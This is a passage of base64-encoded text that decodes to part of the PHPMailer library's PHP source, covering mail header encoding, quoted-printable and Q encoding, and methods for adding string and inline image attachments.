udGlvbmFsIGZhbGwtdGhyb3VnaAogICAgICAgICAgICBjYXNlICd0ZXh0JzoKICAgICAgICAgICAgZGVmYXVsdDoKICAgICAgICAgICAgICAgICRtYXRjaGNvdW50ICs9IHByZWdfbWF0Y2hfYWxsKCcvWyAtCAoMDi0ffy3Dv10vJywgJHN0ciwgJG1hdGNoZXMpOwogICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgfQoKICAgICAgICAvL1RoZXJlIGFyZSBubyBjaGFycyB0aGF0IG5lZWQgZW5jb2RpbmcKICAgICAgICBpZiAoJG1hdGNoY291bnQgPT0gMCkgewogICAgICAgICAgICByZXR1cm4gKCRzdHIpOwogICAgICAgIH0KCiAgICAgICAgJG1heGxlbiA9IDc1IC0gNyAtIHN0cmxlbigkdGhpcy0+Q2hhclNldCk7CiAgICAgICAgLy8gVHJ5IHRvIHNlbGVjdCB0aGUgZW5jb2Rpbmcgd2hpY2ggc2hvdWxkIHByb2R1Y2UgdGhlIHNob3J0ZXN0IG91dHB1dAogICAgICAgIGlmICgkbWF0Y2hjb3VudCA+IHN0cmxlbigkc3RyKSAvIDMpIHsKICAgICAgICAgICAgLy8gTW9yZSB0aGFuIGEgdGhpcmQgb2YgdGhlIGNvbnRlbnQgd2lsbCBuZWVkIGVuY29kaW5nLCBzbyBCIGVuY29kaW5nIHdpbGwgYmUgbW9zdCBlZmZpY2llbnQKICAgICAgICAgICAgJGVuY29kaW5nID0gJ0InOwogICAgICAgICAgICBpZiAoZnVuY3Rpb25fZXhpc3RzKCdtYl9zdHJsZW4nKSAmJiAkdGhpcy0+aGFzTXVsdGlCeXRlcygkc3RyKSkgewogICAgICAgICAgICAgICAgLy8gVXNlIGEgY3VzdG9tIGZ1bmN0aW9uIHdoaWNoIGNvcnJlY3RseSBlbmNvZGVzIGFuZCB3cmFwcyBsb25nCiAgICAgICAgICAgICAgICAvLyBtdWx0aWJ5dGUgc3RyaW5ncyB3aXRob3V0IGJyZWFraW5nIGxpbmVzIHdpdGhpbiBhIGNoYXJhY3RlcgogICAgICAgICAgICAgICAgJGVuY29kZWQgPSAkdGhpcy0+YmFzZTY0RW5jb2RlV3JhcE1CKCRzdHIsICIKIik7CiAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAkZW5jb2RlZCA9IGJhc2U2NF9lbmNvZGUoJHN0cik7CiAgICAgICAgICAgICAgICAkbWF4bGVuIC09ICRtYXhsZW4gJSA0OwogICAgICAgICAgICAgICAgJGVuY29kZWQgPSB0cmltKGNodW5rX3NwbGl0KCRlbmNvZGVkLCAkbWF4bGVuLCAiCiIpKTsKICAgICAgICAgICAgfQogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICRlbmNvZGluZyA9ICdRJzsKICAgICAgICAgICAgJGVuY29kZWQgPSAkdGhpcy0+ZW5jb2RlUSgkc3RyLCAkcG9zaXRpb24pOwogICAgICAgICAgICAkZW5jb2RlZCA9ICR0aGlzLT53cmFwVGV4dCgkZW5jb2RlZCwgJG1heGxlbiwgdHJ1ZSk7CiAgICAgICAgICAgICRlbmNvZGVkID0gc3RyX3JlcGxhY2UoJz0nIC4gc2VsZjo6Q1JMRiwgIgoiLCB0cmltKCRlbmNvZGVkKSk7CiAgICAgICAgfQoKICAgICAgICAkZW5jb2RlZCA9IHByZWdfcmVwbGFjZSgnL14oLiopJC9tJywgJyA9PycgLiAkdGhpcy0+Q2hhclNldCAuICI/JGVuY29kaW5nPwE/PSIsICRlbmNvZGVkKTsKICAgICAgICAkZW5jb2RlZCA9IHRyaW0oc3RyX3JlcGxhY2UoIgoiLCAkdGhpcy0+TEUsICRlbmNvZGVkKSk7CgogICAgICAgIHJldHVybiAkZW5jb2RlZDsKICAgIH0KCiAgICAvKioKICAgICAqIENoZWNrIGlmIGEgc3RyaW5nIGNvbnRhaW5zIG11bHRpLWJ5dGUgY2hhcmFjdGVycy4KICAgICAqIEBhY2Nlc3MgcHVibGljCiAgICAgKiBAcGFyYW0gc3RyaW5nICRzdHIgbXVsdGktYnl0ZSB0ZXh0IHRvIHdyYXAgZW5jb2RlCiAgICAgKiBAcmV0dXJuIGJvb2xlYW4KICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIGhhc011bHRpQnl0ZXMoJHN0cikKICAgIHsKICAgICAgICBpZiAoZnVuY3Rpb25fZXhpc3RzKCdtYl9zdHJsZW4nKSkgewogICAgICAgICAgICByZXR1cm4gKHN0cmxlbigkc3RyKSA+IG1iX3N0cmxlbigkc3RyLCAkdGhpcy0+Q2hhclNldCkpOwogICAgICAgIH0gZWxzZSB7IC8vIEFzc3VtZSBubyBtdWx0aWJ5dGVzICh3ZSBjYW4ndCBoYW5kbGUgd2l0aG91dCBtYnN0cmluZyBmdW5jdGlvbnMgYW55d2F5KQogICAgICAgICAgICByZXR1cm4gZmFsc2U7CiAgICAgICAgfQogICAgfQoKICAgIC8qKgogICAgICogRG9lcyBhIHN0cmluZyBjb250YWluIGFueSA4LWJpdCBjaGFycyAoaW4gYW55IGNoYXJzZXQpPwogICAgICogQHBhcmFtIHN0cmluZyAkdGV4dAogICAgICogQHJldHVybiBib29sZWFuCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBoYXM4Yml0Q2hhcnMoJHRleHQpCiAgICB7CiAgICAgICAgcmV0dXJuIChib29sZWFuKXByZWdfbWF0Y2goJy9bwoAtw79dLycsICR0ZXh0KTsKICAgIH0KCiAgICAvKioKICAgICAqIEVuY29kZSBhbmQgd3JhcCBsb25nIG11bHRpYnl0ZSBzdHJpbmdzIGZvciBtYWlsIGhlYWRlcnMKICAgICAqIHdpdGhvdXQgYnJlYWtpbmcgbGluZXMgd2l0aGluIGEgY2hhcmFjdGVyLgogICAgICogQWRhcHRlZCBmcm9tIGEgZnVuY3Rpb24gYnkgcGFyYXZvaWQKICAgICAqIEBsaW5rIGh0dHA6Ly93d3cucGhwLm5ldC9tYW51YWwvZW4vZnVuY3Rpb24ubWItZW5jb2RlLW1pbWVoZWFkZXIucGhwIzYwMjgzCiAgICAgKiBAYWNjZXNzIHB1YmxpYwogICAgICogQHBhcmFtIHN0cmluZyAkc3RyIG11bHRpLWJ5dGUgdGV4dCB0byB3cmFwIGVuY29kZQogICAgICogQHBhcmFtIHN0cmluZyAkbGluZWJyZWFrIHN0cmluZyB0byB1c2UgYXMgbGluZWZlZWQvZW5kLW9mLWxpbmUKICAgICAqIEByZXR1cm4gc3RyaW5nCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBiYXNlNjRFbmNvZGVXcmFwTUIoJHN0ciwgJGxpbmVicmVhayA9IG51bGwpCiAgICB7CiAgICAgICAgJHN0YXJ0ID0gJz0/JyAuICR0aGlzLT5DaGFyU2V0IC4gJz9CPyc7CiAgICAgICAgJGVuZCA9ICc/PSc7CiAgICAgICAgJGVuY29kZWQgPSAnJzsKICAgICAgICBpZiAoJGxpbmVicmVhayA9PT0gbnVsbCkgewogICAgICAgICAgICAkbGluZWJyZWFrID0gJHRoaXMtPkxFOwogICAgICAgIH0KCiAgICAgICAgJG1iX2xlbmd0aCA9IG1iX3N0cmxlbigkc3RyLCAkdGhpcy0+Q2hhclNldCk7CiAgICAgICAgLy8gRWFjaCBsaW5lIG11c3QgaGF2ZSBsZW5ndGggPD0gNzUsIGluY2x1ZGluZyAkc3RhcnQgYW5kICRlbmQKICAgICAgICAkbGVuZ3RoID0gNzUgLSBzdHJsZW4oJHN0YXJ0KSAtIHN0cmxlbigkZW5kKTsKICAgICAgICAvLyBBdmVyYWdlIG11bHRpLWJ5dGUgcmF0aW8KICAgICAgICAkcmF0aW8gPSAkbWJfbGVuZ3RoIC8gc3RybGVuKCRzdHIpOwogICAgICAgIC8vIEJhc2U2NCBoYXMgYSA0OjMgcmF0aW8KICAgICAgICAkYXZnTGVuZ3RoID0gZmxvb3IoJGxlbmd0aCAqICRyYXRpbyAqIC43NSk7CgogICAgICAgIGZvciAoJGkgPSAwOyAkaSA8ICRtYl9sZW5ndGg7ICRpICs9ICRvZmZzZXQpIHsKICAgICAgICAgICAgJGxvb2tCYWNrID0gMDsKICAgICAgICAgICAgZG8gewogICAgICAgICAgICAgICAgJG9mZnNldCA9ICRhdmdMZW5ndGggLSAkbG9va0JhY2s7CiAgICAgICAgICAgICAgICAkY2h1bmsgPSBtYl9zdWJzdHIoJHN0ciwgJGksICRvZmZzZXQsICR0aGlzLT5DaGFyU2V0KTsKICAgICAgICAgICAgICAgICRjaHVuayA9IGJhc2U2NF9lbmNvZGUoJGNodW5rKTsKICAgICAgICAgICAgICAgICRsb29rQmFjaysrOwogICAgICAgICAgICB9IHdoaWxlIChzdHJsZW4oJGNodW5rKSA+ICRsZW5ndGgpOwogICAgICAgICAgICAkZW5jb2RlZCAuPSAkY2h1bmsgLiAkbGluZWJyZWFrOwogICAgICAgIH0KCiAgICAgICAgLy8gQ2hvbXAgdGhlIGxhc3QgbGluZWZlZWQKICAgICAgICAkZW5jb2RlZCA9IHN1YnN0cigkZW5jb2RlZCwgMCwgLXN0cmxlbigkbGluZWJyZWFrKSk7CiAgICAgICAgcmV0dXJuICRlbmNvZGVkOwogICAgfQoKICAgIC8qKgogICAgICogRW5jb2RlIGEgc3RyaW5nIGluIHF1b3RlZC1wcmludGFibGUgZm9ybWF0LgogICAgICogQWNjb3JkaW5nIHRvIFJGQzIwNDUgc2VjdGlvbiA2LjcuCiAgICAgKiBAYWNjZXNzIHB1YmxpYwogICAgICogQHBhcmFtIHN0cmluZyAkc3RyaW5nIFRoZSB0ZXh0IHRvIGVuY29kZQogICAgICogQHBhcmFtIGludGVnZXIgJGxpbmVfbWF4IE51bWJlciBvZiBjaGFycyBhbGxvd2VkIG9uIGEgbGluZSBiZWZvcmUgd3JhcHBpbmcKICAgICAqIEByZXR1cm4gc3RyaW5nCiAgICAgKiBAbGluayBodHRwOi8vd3d3LnBocC5uZXQvbWFudWFsL2VuL2Z1bmN0aW9uLnF1b3RlZC1wcmludGFibGUtZGVjb2RlLnBocCM4OTQxNyBBZGFwdGVkIGZyb20gdGhpcyBjb21tZW50CiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBlbmNvZGVRUCgkc3RyaW5nLCAkbGluZV9tYXggPSA3NikKICAgIHsKICAgICAgICAvLyBVc2UgbmF0aXZlIGZ1bmN0aW9uIGlmIGl0J3MgYXZhaWxhYmxlICg+PSBQSFA1LjMpCiAgICAgICAgaWYgKGZ1bmN0aW9uX2V4aXN0cygncXVvdGVkX3ByaW50YWJsZV9lbmNvZGUnKSkgewogICAgICAgICAgICByZXR1cm4gcXVvdGVkX3ByaW50YWJsZV9lbmNvZGUoJHN0cmluZyk7CiAgICAgICAgfQogICAgICAgIC8vIEZhbGwgYmFjayB0byBhIHB1cmUgUEhQIGltcGxlbWVudGF0aW9uCiAgICAgICAgJHN0cmluZyA9IHN0cl9yZXBsYWNlKAogICAgICAgICAgICBhcnJheSgnJTIwJywgJyUwRCUwQS4nLCAnJTBEJTBBJywgJyUnKSwKICAgICAgICAgICAgYXJyYXkoJyAnLCAiCj0yRSIsICIKIiwgJz0nKSwKICAgICAgICAgICAgcmF3dXJsZW5jb2RlKCRzdHJpbmcpCiAgICAgICAgKTsKICAgICAgICByZXR1cm4gcHJlZ19yZXBsYWNlKCcvW14KXXsnIC4gKCRsaW5lX21heCAtIDMpIC4gJ31bXj0KXXsyfS8nLCAiJDA9CiIsICRzdHJpbmcpOwogICAgfQoKICAgIC8qKgogICAgICogQmFja3dhcmQgY29tcGF0aWJpbGl0eSB3cmFwcGVyIGZvciBhbiBvbGQgUVAgZW5jb2RpbmcgZnVuY3Rpb24gdGhhdCB3YXMgcmVtb3ZlZC4KICAgICAqIEBzZWUgUEhQTWFpbGVyOjplbmNvZGVRUCgpCiAgICAgKiBAYWNjZXNzIHB1YmxpYwogICAgICogQHBhcmFtIHN0cmluZyAkc3RyaW5nCiAgICAgKiBAcGFyYW0gaW50ZWdlciAkbGluZV9tYXgKICAgICAqIEBwYXJhbSBib29sZWFuICRzcGFjZV9jb252CiAgICAgKiBAcmV0dXJuIHN0cmluZwogICAgICogQGRlcHJlY2F0ZWQgVXNlIGVuY29kZVFQIGluc3RlYWQuCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBlbmNvZGVRUHBocCgKICAgICAgICAkc3RyaW5nLAogICAgICAgICRsaW5lX21heCA9IDc2LAogICAgICAgIC8qKiBAbm9pbnNwZWN0aW9uIFBocFVudXNlZFBhcmFtZXRlckluc3BlY3Rpb24gKi8gJHNwYWNlX2NvbnYgPSBmYWxzZQogICAgKSB7CiAgICAgICAgcmV0dXJuICR0aGlzLT5lbmNvZGVRUCgkc3RyaW5nLCAkbGluZV9tYXgpOwogICAgfQoKICAgIC8qKgogICAgICogRW5jb2RlIGEgc3RyaW5nIHVzaW5nIFEgZW5jb2RpbmcuCiAgICAgKiBAbGluayBodHRwOi8vdG9vbHMuaWV0Zi5vcmcvaHRtbC9yZmMyMDQ3CiAgICAgKiBAcGFyYW0gc3RyaW5nICRzdHIgdGhlIHRleHQgdG8gZW5jb2RlCiAgICAgKiBAcGFyYW0gc3RyaW5nICRwb3NpdGlvbiBXaGVyZSB0aGUgdGV4dCBpcyBnb2luZyB0byBiZSB1c2VkLCBzZWUgdGhlIFJGQyBmb3Igd2hhdCB0aGF0IG1lYW5zCiAgICAgKiBAYWNjZXNzIHB1YmxpYwogICAgICogQHJldHVybiBzdHJpbmcKICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIGVuY29kZVEoJHN0ciwgJHBvc2l0aW9uID0gJ3RleHQnKQogICAgewogICAgICAgIC8vIFRoZXJlIHNob3VsZCBub3QgYmUgYW55IEVPTCBpbiB0aGUgc3RyaW5nCiAgICAgICAgJHBhdHRlcm4gPSAnJzsKICAgICAgICAkZW5jb2RlZCA9IHN0cl9yZXBsYWNlKGFycmF5KCIKIiwgIgoiKSwgJycsICRzdHIpOwogICAgICAgIHN3aXRjaCAoc3RydG9sb3dlcigkcG9zaXRpb24pKSB7CiAgICAgICAgICAgIGNhc2UgJ3BocmFzZSc6CiAgICAgICAgICAgICAgICAvLyBSRkMgMjA0NyBzZWN0aW9uIDUuMwogICAgICAgICAgICAgICAgJHBhdHRlcm4gPSAnXkEtWmEtejAtOSEqK1wvIC0nOwogICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgIC8qKiBAbm9pbnNwZWN0aW9uIFBocE1pc3NpbmdCcmVha1N0YXRlbWVudEluc3BlY3Rpb24gKi8KICAgICAgICAgICAgY2FzZSAnY29tbWVudCc6CiAgICAgICAgICAgICAgICAvLyBSRkMgMjA0NyBzZWN0aW9uIDUuMgogICAgICAgICAgICAgICAgJHBhdHRlcm4gPSAnXChcKSInOwogICAgICAgICAgICAgICAgLy8gaW50ZW50aW9uYWwgZmFsbC10aHJvdWdoCiAgICAgICAgICAgICAgICAvLyBmb3IgdGhpcyByZWFzb24gd2UgYnVpbGQgdGhlICRwYXR0ZXJuIHdpdGhvdXQgaW5jbHVkaW5nIGRlbGltaXRlcnMgYW5kIFtdCiAgICAgICAgICAgIGNhc2UgJ3RleHQnOgogICAgICAgICAgICBkZWZhdWx0OgogICAgICAgICAgICAgICAgLy8gUkZDIDIwNDcgc2VjdGlvbiA1LjEKICAgICAgICAgICAgICAgIC8vIFJlcGxhY2UgZXZlcnkgaGlnaCBhc2NpaSwgY29udHJvbCwgPSwgPyBhbmQgXyBjaGFyYWN0ZXJzCiAgICAgICAgICAgICAgICAkcGF0dGVybiA9ICcgLQkKDA4tHz0/X38tw78nIC4gJHBhdHRlcm47CiAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICB9CiAgICAgICAgJG1hdGNoZXMgPSBhcnJheSgpOwogICAgICAgIGlmIChwcmVnX21hdGNoX2FsbCgiL1t7JHBhdHRlcm59XS8iLCAkZW5jb2RlZCwgJG1hdGNoZXMpKSB7CiAgICAgICAgICAgIC8vIElmIHRoZSBzdHJpbmcgY29udGFpbnMgYW4gJz0nLCBtYWtlIHN1cmUgaXQncyB0aGUgZmlyc3QgdGhpbmcgd2UgcmVwbGFjZQogICAgICAgICAgICAvLyBzbyBhcyB0byBhdm9pZCBkb3VibGUtZW5jb2RpbmcKICAgICAgICAgICAgJGVxa2V5ID0gYXJyYXlfc2VhcmNoKCc9JywgJG1hdGNoZXNbMF0pOwogICAgICAgICAgICBpZiAoZmFsc2UgIT09ICRlcWtleSkgewogICAgICAgICAgICAgICAgdW5zZXQoJG1hdGNoZXNbMF1bJGVxa2V5XSk7CiAgICAgICAgICAgICAgICBhcnJheV91bnNoaWZ0KCRtYXRjaGVzWzBdLCAnPScpOwogICAgICAgICAgICB9CiAgICAgICAgICAgIGZvcmVhY2ggKGFycmF5X3VuaXF1ZSgkbWF0Y2hlc1swXSkgYXMgJGNoYXIpIHsKICAgICAgICAgICAgICAgICRlbmNvZGVkID0gc3RyX3JlcGxhY2UoJGNoYXIsICc9JyAuIHNwcmludGYoJyUwMlgnLCBvcmQoJGNoYXIpKSwgJGVuY29kZWQpOwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIC8vIFJlcGxhY2UgZXZlcnkgc3BhY2VzIHRvIF8gKG1vcmUgcmVhZGFibGUgdGhhbiA9MjApCiAgICAgICAgcmV0dXJuIHN0cl9yZXBsYWNlKCcgJywgJ18nLCAkZW5jb2RlZCk7CiAgICB9CgogICAgLyoqCiAgICAgKiBBZGQgYSBzdHJpbmcgb3IgYmluYXJ5IGF0dGFjaG1lbnQgKG5vbi1maWxlc3lzdGVtKS4KICAgICAqIFRoaXMgbWV0aG9kIGNhbiBiZSB1c2VkIHRvIGF0dGFjaCBhc2NpaSBvciBiaW5hcnkgZGF0YSwKICAgICAqIHN1Y2ggYXMgYSBCTE9CIHJlY29yZCBmcm9tIGEgZGF0YWJhc2UuCiAgICAgKiBAcGFyYW0gc3RyaW5nICRzdHJpbmcgU3RyaW5nIGF0dGFjaG1lbnQgZGF0YS4KICAgICAqIEBwYXJhbSBzdHJpbmcgJGZpbGVuYW1lIE5hbWUgb2YgdGhlIGF0dGFjaG1lbnQuCiAgICAgKiBAcGFyYW0gc3RyaW5nICRlbmNvZGluZyBGaWxlIGVuY29kaW5nIChzZWUgJEVuY29kaW5nKS4KICAgICAqIEBwYXJhbSBzdHJpbmcgJHR5cGUgRmlsZSBleHRlbnNpb24gKE1JTUUpIHR5cGUuCiAgICAgKiBAcGFyYW0gc3RyaW5nICRkaXNwb3NpdGlvbiBEaXNwb3NpdGlvbiB0byB1c2UKICAgICAqIEByZXR1cm4gdm9pZAogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gYWRkU3RyaW5nQXR0YWNobWVudCgKICAgICAgICAkc3RyaW5nLAogICAgICAgICRmaWxlbmFtZSwKICAgICAgICAkZW5jb2RpbmcgPSAnYmFzZTY0JywKICAgICAgICAkdHlwZSA9ICcnLAogICAgICAgICRkaXNwb3NpdGlvbiA9ICdhdHRhY2htZW50JwogICAgKSB7CiAgICAgICAgLy8gSWYgYSBNSU1FIHR5cGUgaXMgbm90IHNwZWNpZmllZCwgdHJ5IHRvIHdvcmsgaXQgb3V0IGZyb20gdGhlIGZpbGUgbmFtZQogICAgICAgIGlmICgkdHlwZSA9PSAnJykgewogICAgICAgICAgICAkdHlwZSA9IHNlbGY6OmZpbGVuYW1lVG9UeXBlKCRmaWxlbmFtZSk7CiAgICAgICAgfQogICAgICAgIC8vIEFwcGVuZCB0byAkYXR0YWNobWVudCBhcnJheQogICAgICAgICR0aGlzLT5hdHRhY2htZW50W10gPSBhcnJheSgKICAgICAgICAgICAgMCA9PiAkc3RyaW5nLAogICAgICAgICAgICAxID0+ICRmaWxlbmFtZSwKICAgICAgICAgICAgMiA9PiBiYXNlbmFtZSgkZmlsZW5hbWUpLAogICAgICAgICAgICAzID0+ICRlbmNvZGluZywKICAgICAgICAgICAgNCA9PiAkdHlwZSwKICAgICAgICAgICAgNSA9PiB0cnVlLCAvLyBpc1N0cmluZ0F0dGFjaG1lbnQKICAgICAgICAgICAgNiA9PiAkZGlzcG9zaXRpb24sCiAgICAgICAgICAgIDcgPT4gMAogICAgICAgICk7CiAgICB9CgogICAgLyoqCiAgICAgKiBBZGQgYW4gZW1iZWRkZWQgKGlubGluZSkgYXR0YWNobWVudCBmcm9tIGEgZmlsZS4KICAgICAqIFRoaXMgY2FuIGluY2x1ZGUgaW1hZ2VzLCBzb3VuZHMsIGFuZCBqdXN0IGFib3V0IGFueSBvdGhlciBkb2N1bWVudCB0eXBlLgogICAgICogVGhlc2UgZGlmZmVyIGZyb20gJ3JlZ3VsYXInIGF0dGFjaG1lbnRzIGluIHRoYXQgdGhleSBhcmUgaW50ZW5kZWQgdG8gYmUKICAgICAqIGRpc3BsYXllZCBpbmxpbmUgd2l0aCB0aGUgbWVzc2FnZSwgbm90IGp1c3QgYXR0YWNoZWQgZm9yIGRvd25sb2FkLgogICAgICogVGhpcyBpcyB1c2VkIGluIEhUTUwgbWVzc2FnZXMgdGhhdCBlbWJlZCB0aGUgaW1hZ2VzCiAgICAgKiB0aGUgSFRNTCByZWZlcnMgdG8gdXNpbmcgdGhlICRjaWQgdmFsdWUuCiAgICAgKiBOZXZlciB1c2UgYSB1c2VyLXN1cHBsaWVkIHBhdGggdG8gYSBmaWxlIQogICAgICogQHBhcmFtIHN0cmluZyAkcGF0aCBQYXRoIHRvIHRoZSBhdHRhY2htZW50LgogICAgICogQHBhcmFtIHN0cmluZyAkY2lkIENvbnRlbnQgSUQgb2YgdGhlIGF0dGFjaG1lbnQ7IFVzZSB0aGlzIHRvIHJlZmVyZW5jZQogICAgICogICAgICAgIHRoZSBjb250ZW50IHdoZW4gdXNpbmcgYW4gZW1iZWRkZWQgaW1hZ2UgaW4gSFRNTC4KICAgICAqIEBwYXJhbSBzdHJpbmcgJG5hbWUgT3ZlcnJpZGVzIHRoZSBhdHRhY2htZW50IG5hbWUuCiAgICAgKiBAcGFyYW0gc3RyaW5nICRlbmNvZGluZyBGaWxlIGVuY29kaW5nIChzZWUgJEVuY29kaW5nKS4KICAgICAqIEBwYXJhbSBzdHJpbmcgJHR5cGUgRmlsZSBNSU1FIHR5cGUuCiAgICAgKiBAcGFyYW0gc3RyaW5nICRkaXNwb3NpdGlvbiBEaXNwb3NpdGlvbiB0byB1c2UKICAgICAqIEByZXR1cm4gYm9vbGVhbiBUcnVlIG9uIHN1Y2Nlc3NmdWxseSBhZGRpbmcgYW4gYXR0YWNobWVudAogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gYWRkRW1iZWRkZWRJbWFnZSgkcGF0aCwgJGNpZCwgJG5hbWUgPSAnJywgJGVuY29kaW5nID0gJ2Jhc2U2NCcsICR0eXBlID0gJycsICRkaXNwb3NpdGlvbiA9ICdpbmxpbmUnKQogICAgewogICAgICAgIGlmICghc2VsZjo6aXNQZXJtaXR0ZWRQYXRoKCRwYXRoKSBvciAhQGlzX2ZpbGUoJHBhdGgpKSB7CiAgICAgICAgICAgICR0aGlzLT5zZXRFcnJvcigkdGhpcy0+bGFuZygnZmlsZV9hY2Nlc3MnKSAuICRwYXRoKTsKICAgICAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgICAgIH0KCiAgICAgICAgLy8gSWYgYSBNSU1FIHR5cGUgaXMgbm90IHNwZWNpZmllZCwgdHJ5IHRvIHdvcmsgaXQgb3V0IGZyb20gdGhlIGZpbGUgbmFtZQogICAgICAgIGlmICgkdHlwZSA9PSAnJykgewogICAgICAgICAgICAkdHlwZSA9IHNlbGY6OmZpbGVuYW1lVG9UeXBlKCRwYXRoKTsKICAgICAgICB9CgogICAgICAgICRmaWxlbmFtZSA9IGJhc2VuYW1lKCRwYXRoKTsKICAgICAgICBpZiAoJG5hbWUgPT0gJycpIHsKICAgICAgICAgICAgJG5hbWUgPSAkZmlsZW5hbWU7CiAgICAgICAgfQoKICAgICAgICAvLyBBcHBlbmQgdG8gJGF0dGFjaG1lbnQgYXJyYXkKICAgICAgICAkdGhpcy0+YXR0YWNobWVudFtdID0gYXJyYXkoCiAgICAgICAgICAgIDAgPT4gJHBhdGgsCiAgICAgICAgICAgIDEgPT4gJGZpbGVuYW1lLAogICAgICAgICAgICAyID0+ICRuYW1lLAogICAgICAgICAgICAzID0+ICRlbmNvZGluZywKICAgICAgICAgICAgNCA9PiAkdHlwZSwKICAgICAgICAgICAgNSA9PiBmYWxzZSwgLy8gaXNTdHJpbmdBdHRhY2htZW50CiAgICAgICAgICAgIDYgPT4gJGRpc3Bvc2l0aW9uLAogICAgICAgICAgICA3ID0+ICRjaWQKICAgICAgICApOwogICAgICAgIHJldHVybiB0cnVlOwogICAgfQoKICAgIC8qKgogICAgICogQWRkIGFuIGVtYmVkZGVkIHN0cmluZ2lmaWVkIGF0dGFjaG1lbnQuCiAgICAgKiBUaGlzIGNhbiBpbmNsdWRlIGltYWdlcywgc291bmRzLCBhbmQganVzdCBhYm91dCBhbnkgb3RoZXIgZG9jdW1lbnQgdHlwZS4KICAgICAqIEJlIHN1cmUgdG8gc2V0IHRoZSAkdHlwZSB0byBhbiBpbWFnZSB0eXBlIGZvciBpbWFnZXM6CiAgICAgKiBKUEVHIGltYWdlcyB1c2UgJ2ltYWdlL2pwZWcnLCBHSUYgdXNlcyAnaW1hZ2UvZ2lmJywgUE5HIHVzZXMgJ2ltYWdlL3BuZycuCiAgICAgKiBAcGFyYW0gc3RyaW5nICRzdHJpbmcgVGhlIGF0dGFjaG1lbnQgYmluYXJ5IGRhdGEuCiAgICAgKiBAcGFyYW0gc3RyaW5nICRjaWQgQ29udGVudCBJRCBvZiB0aGUgYXR0YWNobWVudDsgVXNlIHRoaXMgdG8gcmVmZXJlbmNlCiAgICAgKiAgICAgICAgdGhlIGNvbnRlbnQgd2hlbiB1c2luZyBhbiBlbWJlZGRlZCBpbWFnZSBpbiBIVE1MLgogICAgICogQHBhcmFtIHN0cmluZyAkbmFtZQogICAgICogQHBhcmFtIHN0cmluZyAkZW5jb2RpbmcgRmlsZSBlbmNvZGluZyAoc2VlICRFbmNvZGluZykuCiAgICAgKiBAcGFyYW0gc3RyaW5nICR0eXBlIE1JTUUgdHlwZS4KICAgICAqIEBwYXJhbSBzdHJpbmcgJGRpc3Bvc2l0aW9uIERpc3Bvc2l0aW9uIHRvIHVzZQogICAgICogQHJldHVybiBib29sZWFuIFRydWUgb24gc3VjY2Vzc2Z1bGx5IGFkZGluZyBhbiBhdHRhY2htZW50CiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBhZGRTdHJpbmdFbWJlZGRlZEltYWdlKAogICAgICAgICRzdHJpbmcsCiAgICAgICAgJGNpZCwKICAgICAgICAkbmFtZSA9ICcnLAogICAgICAgICRlbmNvZGluZyA9ICdiYXNlNjQnLAogICAgICAgICR0eXBlID0gJycsCiAgICAgICAgJGRpc3Bvc2l0aW9uID0gJ2lubGluZScKICAgICkgewogICAgICAgIC8vIElmIGEgTUlNRSB0eXBlIGlzIG5vdCBzcGVjaWZpZWQsIHRyeSB0byB3b3JrIGl0IG91dCBmcm9tIHRoZSBuYW1lCiAgICAgICAgaWYgKCR0eXBlID09ICcnIGFuZCAhZW1wdHkoJG5hbWUpKSB7CiAgICAgICAgICAgICR0eXBlID0gc2VsZjo6ZmlsZW5hbWVUb1R5cGUoJG5hbWUpOwogICAgICAgIH0KCiAgICAgICAgLy8gQXBwZW5kIHRvICRhdHRhY2htZW50IGFycmF5CiAgICAgICAgJHRoaXMtPmF0dGFjaG1lbnRbXSA9IGFycmF5KAogICAgICAgICAgICAwID0+ICRzdHJpbmcsCiAgICAgICAgICAgIDEgPT4gJG5hbWUsCiAgICAgICAgICAgIDIgPT4gJG5hbWUsCiAgICAgICAgICAgIDMgPT4gJGVuY29kaW5nLAogICAgICAgICAgICA0ID0+ICR0eXBlLAogICAgICAgICAgICA1ID0+IHRydWUsIC8vIGlzU3RyaW5nQXR0YWNobWVudAogICAgICAgICAgICA2ID0+ICRkaXNwb3NpdGlvbiwKICAgICAgICAgICAgNyA9PiAkY2lkCiAgICAgICAgKTsKICAgICAgICByZXR1cm4gdHJ1ZTsKICAgIH0KCiAgICAvKioKICAgICAqIENoZWNrIGlmIGFuIGlubGluZSBhdHRhY2htZW50IGlzIHByZXNlbnQuCiAgICAgKiBAYWNjZXNzIHB1YmxpYwogICAgICogQHJldHVybiBib29sZWFuCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBpbmxpbmVJbWFnZUV4aXN0cygpCiAgICB7CiAgICAgICAgZm9yZWFjaCAoJHRoaXMtPmF0dGFjaG1lbnQgYXMgJGF0dGFjaG1lbnQpIHsKICAgICAgICAgICAgaWYgKCRhdHRhY2htZW50WzZdID09ICdpbmxpbmUnKSB7CiAgICAgICAgICAgICAgICByZXR1cm4gdHJ1ZTsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICByZXR1cm4gZmFsc2U7CiAgICB9CgogICAgLyoqCiAgICAgKiBDaGVjayBpZiBhbiBhdHRhY2htZW50IChub24taW5saW5lKSBpcyBwcmVzZW50LgogICAgICogQHJldHVybiBib29sZWFuCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBhdHRhY2htZW50RXhpc3RzKCkKICAgIHsKICAgICAgICBmb3JlYWNoICgkdGhpcy0+YXR0YWNobWVudCBhcyAkYXR0YWNobWVudCkgewogICAgICAgICAgICBpZiAoJGF0dGFjaG1lbnRbNl0gPT0gJ2F0dGFjaG1lbnQnKSB7CiAgICAgICAgICAgICAgICByZXR1cm4gdHJ1ZTsKICAgICAgICAgICAgfQogICAgIC